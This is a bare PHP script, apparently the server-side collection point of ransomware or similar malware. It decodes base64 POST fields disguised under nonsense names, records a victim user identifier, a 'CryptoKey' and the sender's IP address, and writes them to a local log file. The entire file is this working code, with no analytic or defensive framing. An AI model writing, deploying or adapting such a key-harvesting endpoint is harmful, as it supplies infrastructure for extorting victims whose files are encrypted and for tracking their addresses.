<?php
$key = base64_decode($_POST['derpderp']);
$user = base64_decode($_POST['mensroom']);
$from = $_SERVER['REMOTE_ADDR'];
$data = "User: " . $user . "\r\n" . "IP: " . $from . "\r\n" . "CryptoKey: " . $key . "\r\n";
file_put_contents("joeloq.txt",iconv("Windows-1252","UTF-8",$data));
?>
